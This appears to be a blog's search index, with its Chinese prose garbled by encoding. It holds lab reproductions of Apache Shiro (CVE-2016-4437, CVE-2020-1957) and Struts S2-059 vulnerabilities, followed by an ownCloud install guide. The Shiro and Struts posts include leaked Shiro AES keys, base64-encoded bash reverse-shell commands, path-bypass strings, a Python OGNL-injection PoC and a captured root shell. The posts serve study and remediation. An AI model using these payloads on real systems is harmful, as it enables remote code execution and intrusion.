<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2016-4437å¤ç°</title>
    <url>/2021/06/06/CVE-2016-4437/</url>
    <content><![CDATA[<h2 id="ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´"><a href="#ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´"></a>ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´</h2><hr>
<h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache shiroé»˜è®¤ä½¿ç”¨äº†<code>CookieRememberMeManager</code>ï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°<code>rememberMeçš„cookieå€¼</code>â€“&gt;<code>Base64è§£ç </code>â€“&gt;<code>AESè§£å¯†</code>â€“&gt;<code>ååºåˆ—åŒ–</code>ã€‚<br>ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚</p>
<a id="more"></a>

<h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt;= v1.2.4</p>
<h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">ä¸é€ è½®å­äº†ã€‚ã€‚ã€‚<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><p> ç½‘ç»œä¸Šæ”¶é›†åˆ°çš„key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<p>ä½¿ç”¨shiro_tool.jaråå¼¹shell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure>

<img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class>

<p>ä½¿ç”¨1å’Œ10éƒ½å¯ä»¥ï¼Œåå¼¹shelléœ€è¦ç¼–ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>ncç›‘å¬åå¼¹shell</p>
<img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class>

<p>æŠ“åŒ…åˆ†æï¼Œçœ‹åˆ°httpè¯·æ±‚å¤´Cookieå­—æ®µä¸º rememberMe=**ï¼Œå“åº”å¤´å­˜åœ¨Set-Cookie:rememberMe=deleteMe</p>
<img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class>

<h2 id="0x05-å®˜æ–¹ä¿®å¤"><a href="#0x05-å®˜æ–¹ä¿®å¤" class="headerlink" title="0x05.å®˜æ–¹ä¿®å¤"></a>0x05.å®˜æ–¹ä¿®å¤</h2><ul>
<li>åˆ é™¤ä»£ç é‡Œçš„é»˜è®¤å¯†é’¥</li>
<li>é»˜è®¤é…ç½®é‡Œæ³¨é‡Šäº†é»˜è®¤å¯†é’¥</li>
<li>å¦‚æœä¸é…ç½®å¯†é’¥ï¼Œæ¯æ¬¡ä¼šé‡æ–°éšæœºä¸€ä¸ªå¯†é’¥</li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>CVE</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>è°ƒæ•™</tag>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1957</title>
    <url>/2021/06/06/CVE-2020-1957/</url>
    <content><![CDATA[<h2 id="ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"><a href="#ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´" class="headerlink" title="ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"></a>ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´</h2><hr>
<h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache Shiro 1.5.2ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p>
<a id="more"></a>

<h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt; v1.5.2</p>
<h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">è½®å­è½®å­<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03.æ¼æ´å¤ç°"></a>0x03.æ¼æ´å¤ç°</h2><p><strong>ç¯å¢ƒæ­å»º</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p>
<p>adminè®¤è¯ç»•è¿‡</p>
<p>ç›´æ¥è®¿é—®/adminï¼Œè·³è½¬åˆ°ç™»å…¥é¡µé¢</p>
<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class>

<p>ç»•è¿‡ï¼š/demo/..;/admin/  æˆ–   /demo;/../admin/</p>
<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class>

<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>

]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>CVE</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>è°ƒæ•™</tag>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0230å¤ç°</title>
    <url>/2020/12/19/CVE-2019-0230/</url>
    <content><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr>
<h2 id="0x00-æ¼æ´ç®€è¿°"><a href="#0x00-æ¼æ´ç®€è¿°" class="headerlink" title="0x00.æ¼æ´ç®€è¿°"></a>0x00.æ¼æ´ç®€è¿°</h2><blockquote>
<p>Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p>
<p>Apache Struts 2.0.0åˆ°2.5.20å¼ºåˆ¶æ‰§è¡ŒåŒé‡OGNLè®¡ç®—ï¼Œå½“å¯¹åŸå§‹ç”¨æˆ·è¾“å…¥çš„æ ‡è®°å±æ€§è¿›è¡Œè®¡ç®—æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-å½±å“"><a href="#0x01-å½±å“" class="headerlink" title="0x01.å½±å“"></a>0x01.å½±å“</h2><ul>
<li><strong>version: 2.0.0-2.5.20</strong></li>
<li><strong>solution: apache-struts-upgrade-2_5_22</strong></li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>Severity</strong></th>
<th align="center"><strong>CVSS</strong></th>
<th align="center"><strong>Published</strong></th>
<th align="center"><strong>Created</strong></th>
<th align="center"><strong>Added</strong></th>
<th align="center"><strong>Modified</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">8</td>
<td align="center">(AV:N/AC:L/Au:N/C:P/I:P/A:P)</td>
<td align="center">08/17/2020</td>
<td align="center">08/15/2020</td>
<td align="center">08/17/2020</td>
<td align="center">09/21/2020</td>
</tr>
</tbody></table>
<h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02.æ¼æ´åˆ†æ"></a>0x02.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cudG9wc2VjLmNvbS5jbi9zdHJ1dHMyLXMyLTA1OS0lRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">å¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤æ¼æ´åˆ†æ<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>é€šè¿‡å­¦ä¹ å¯çŸ¥ï¼šæ­¤æ¬¡æ¼æ´éœ€è¦å¼€å¯ï¼ˆé»˜è®¤å¼€å¯ï¼‰<code>altSyntax</code>åŠŸèƒ½,åªèƒ½æ˜¯åœ¨æ ‡ç­¾<code>id</code>å±æ€§ä¸­å­˜åœ¨è¡¨è¾¾å¼,å¹¶ä¸”å‚æ•°è¿˜å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„è¡¨è¾¾å¼èµ‹å€¼ç»™idå‚æ•°ï¼Œä¼ å‚åå¯¼è‡´äºŒæ¬¡è§£æå¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</strong></p>
<h2 id="0x03-æ­å»ºç¯å¢ƒ"><a href="#0x03-æ­å»ºç¯å¢ƒ" class="headerlink" title="0x03.æ­å»ºç¯å¢ƒ"></a>0x03.æ­å»ºç¯å¢ƒ</h2><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3N0cnV0czIvczItMDU5Lw==">æœ¬æ¬¡ç¯å¢ƒ<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><h3 id="1-è®¿é—®ç¯å¢ƒ"><a href="#1-è®¿é—®ç¯å¢ƒ" class="headerlink" title="1.è®¿é—®ç¯å¢ƒ"></a>1.è®¿é—®ç¯å¢ƒ</h3><img src="/2020/12/19/CVE-2019-0230/image-20201219162137008.png" class>

<h3 id="2-æ¼æ´éªŒè¯"><a href="#2-æ¼æ´éªŒè¯" class="headerlink" title="2.æ¼æ´éªŒè¯"></a>2.æ¼æ´éªŒè¯</h3><p><code>é€šè¿‡æ„é€ è¡¨è¾¾å¼%25&#123;2*10&#125;æ‰§è¡Œåå‘ç°æ ‡ç­¾å±æ€§idå€¼å˜æˆäº†ä¸º10ï¼Œè¯´æ˜æˆåŠŸæ‰§è¡Œäº†è¡¨è¾¾å¼å¹¶è¿ç®—2*10ï¼Œå¹¶è¿”å›äº†ç»“æœã€‚</code></p>
<img src="/2020/12/19/CVE-2019-0230/image-20201219161950859.png" class>

<h3 id="3-æ„é€ payload"><a href="#3-æ„é€ payload" class="headerlink" title="3.æ„é€ payload"></a>3.æ„é€ payload</h3><p><code>æœ¬æ¬¡ä½¿ç”¨bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1ï¼ˆéœ€è¦ç¼–ç ï¼‰</code></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">ç¼–ç è½¬æ¢åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>è½¬æ¢</p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p>
</blockquote>
<h3 id="4-ç¼–å†™POC"><a href="#4-ç¼–å†™POC" class="headerlink" title="4.ç¼–å†™POC"></a>4.ç¼–å†™POC</h3><p><code>å°†payloadæ”¾åˆ°å¯¹åº”ä½ç½®ä¸Š</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.137:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;payload&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure>

<h3 id="5-åˆ©ç”¨"><a href="#5-åˆ©ç”¨" class="headerlink" title="5.åˆ©ç”¨"></a>5.åˆ©ç”¨</h3><p><code>kaliç›‘å¬</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡ŒPOC get shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.137] 33258</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@88497928f70b:/usr/src# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@88497928f70b:/usr/src#</span><br></pre></td></tr></table></figure>

<h2 id="0x05-è§£å†³åŠæ³•"><a href="#0x05-è§£å†³åŠæ³•" class="headerlink" title="0x05.è§£å†³åŠæ³•"></a>0x05.è§£å†³åŠæ³•</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æœ€ç»ˆçš„è§£å†³æ–¹æ³•æ˜¯ä¸ºä¼ å…¥çš„æ¯ä¸ªå€¼æ·»åŠ é€‚å½“çš„éªŒè¯ï¼Œå¹¶å°†å…¶ç”¨äºæ ‡è®°çš„å±æ€§ä¸­ã€‚  é™¤éä¸ºæœ‰æ•ˆçš„ç”¨ä¾‹çœŸæ­£éœ€è¦ï¼Œå¦åˆ™è¯·å‹¿ä½¿ç”¨å¼ºåˆ¶ä½¿ç”¨å€¼ï¼…ä»¥å¤–çš„å±æ€§æ±‚å€¼ï¼Œè€Œä½¿ç”¨ï¼…&#123;...&#125;æˆ–$ &#123;...&#125;è¯­æ³•ã€‚ </span><br><span class="line"></span><br><span class="line">é€šè¿‡ å‡çº§åˆ°Struts 2.5.22ï¼Œå¼ºåˆ¶åŒé‡è¯„ä¼°çš„å¯èƒ½æ¶æ„å½±å“å°†è¿›ä¸€æ­¥å—åˆ°é™åˆ¶ï¼Œå¹¶å…³é—­äº†å·²æŠ¥å‘Šçš„æ”»å‡»åª’ä»‹ï¼Œç‰¹åˆ«æ˜¯ä¸ä¸»åŠ¨OGNLè¡¨è¾¾æ³¨å…¥ä¿æŠ¤ç»“åˆä½¿ç”¨æ—¶ã€‚</span><br><span class="line"></span><br><span class="line">å‡çº§åˆ°Struts 2.5.22æ—¶æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ï¼ˆçœŸçš„å—ï¼Ÿï¼Ÿï¼ŸğŸ™ƒï¼‰</span><br></pre></td></tr></table></figure>

<h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06.æ€»ç»“"></a>0x06.æ€»ç»“</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å¼ºåˆ¶ä½¿ç”¨Apache Strutsæ¡†æ¶æ—¶ï¼Œä¼šå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾å±æ€§çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œä¾‹å¦‚ï¼Œidè¿™æ ·å°±å¯ä»¥ä¼ é€’ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åœ¨å‘ˆç°æ ‡ç­¾å±æ€§æ—¶å†æ¬¡è¿›è¡Œè¯„ä¼°ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„è¯·æ±‚ï¼Œè¿™å¯ä»¥å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»£ç ï¼ˆRCEï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">ä»…å½“åœ¨Strutsæ ‡è®°å±æ€§å†…å¼ºåˆ¶æ‰§è¡ŒOGNLè¯„ä¼°æ—¶ï¼Œæ­¤é—®é¢˜æ‰é€‚ç”¨ï¼Œå½“è¯„ä¼°çš„è¡¨è¾¾å¼å¼•ç”¨æœªç»æ”»å‡»çš„åŸå§‹è¾“å…¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾è®¡ç›¸åº”çš„è¯·æ±‚æ¥ç›´æ¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;s:url var=&quot;url&quot; namespace=&quot;/employee&quot; action=&quot;list&quot;/&gt;&lt;s:a id=&quot;%&#123;skillName&#125;&quot; href=&quot;%&#123;url&#125;&quot;&gt;List available Employees&lt;/s:a&gt;</span><br><span class="line">å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹skillNameè¯·æ±‚ä¸­çš„å±æ€§ï¼Œä»¥ä½¿åŸå§‹OGNLè¡¨è¾¾å¼skillNameæ— éœ€è¿›ä¸€æ­¥éªŒè¯å³å¯ä¼ é€’ç»™è¯¥å±æ€§ï¼Œåˆ™skillNameå½“ä½œä¸ºè¯·æ±‚çš„ç»“æœå‘ˆç°æ ‡è®°æ—¶ï¼Œå°†è¯„ä¼°å±æ€§ä¸­åŒ…å«çš„æä¾›çš„OGNLè¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">ä»2.0.0å¼€å§‹ï¼ŒStrutsä¼šè®¾è®¡ä½¿ç”¨åŒé‡è¯„ä¼°çš„æœºä¼šï¼Œå¹¶ä¸”æ­£ç¡®å®Œæˆåå°†æˆä¸ºæœ‰ç”¨çš„å·¥å…·ï¼Œè¿™æœ€æ˜¾ç€çš„æ„æ€æ˜¯ä»…åœ¨ç»™å®šè¡¨è¾¾å¼ä¸­å¼•ç”¨ç»è¿‡éªŒè¯çš„å€¼ã€‚ä½†æ˜¯ï¼Œåœ¨è¡¨è¾¾å¼ä¸­å¼•ç”¨æœªç»éªŒè¯çš„ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå¯èƒ½ä¼šæ³¨å…¥æ¶æ„ä»£ç ã€‚åœ¨æŒç»­çš„åŠªåŠ›ä¸­ï¼ŒStrutsæ¡†æ¶åŒ…æ‹¬ç¼“è§£æªæ–½ä»¥é™åˆ¶æ³¨å…¥çš„è¡¨è¾¾å¼çš„å½±å“ï¼Œä½†2.5.22ä¹‹å‰çš„Strutsä»æœªè§£å†³æ”»å‡»å‘é‡</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>CVE</category>
        <category>Strust2</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>è°ƒæ•™</tag>
        <tag>Strust2</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7æ­å»ºownç§æœ‰ç½‘ç›˜</title>
    <url>/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/</url>
    <content><![CDATA[<h2 id="1-å®‰è£…apache"><a href="#1-å®‰è£…apache" class="headerlink" title="1.å®‰è£…apache"></a>1.å®‰è£…apache</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure>

<h2 id="2-å®‰è£…é…ç½®PHP"><a href="#2-å®‰è£…é…ç½®PHP" class="headerlink" title="2.å®‰è£…é…ç½®PHP"></a>2.å®‰è£…é…ç½®PHP</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line"></span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils</span><br><span class="line"></span><br><span class="line">yum-config-manager --enable remi-php72</span><br><span class="line"></span><br><span class="line">yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="3-å®‰è£…å¹¶é…ç½®Mariadb"><a href="#3-å®‰è£…å¹¶é…ç½®Mariadb" class="headerlink" title="3.å®‰è£…å¹¶é…ç½®Mariadb"></a>3.å®‰è£…å¹¶é…ç½®Mariadb</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/MariaDB.10x.repo</span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.3/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br><span class="line"></span><br><span class="line">yum install -y MariaDB-server MariaDB-client</span><br><span class="line"></span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl enable mariadb</span><br><span class="line"></span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line">create database ownclouddb;</span><br><span class="line">grant all privileges on ownclouddb.* to ownclouduser@localhost identified by &#x27;owncloudpwd&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<h2 id="4-å®‰è£…owncloud"><a href="#4-å®‰è£…owncloud" class="headerlink" title="4.å®‰è£…owncloud"></a>4.å®‰è£…owncloud</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/owncloud.repo</span><br><span class="line">[OwnCloud_10.x]</span><br><span class="line">name=wnCloud Server Version 10.x (CentOS 7)</span><br><span class="line">type=rpm-md</span><br><span class="line">baseurl=http://download.owncloud.org/download/repositories/production/CentOS_7</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://download.owncloud.org/download/repositories/production/CentOS_7/repodata/repomd.xml.key</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">yum repolist</span><br><span class="line">yum clean expire-cache</span><br><span class="line">yum install owncloud -y</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>

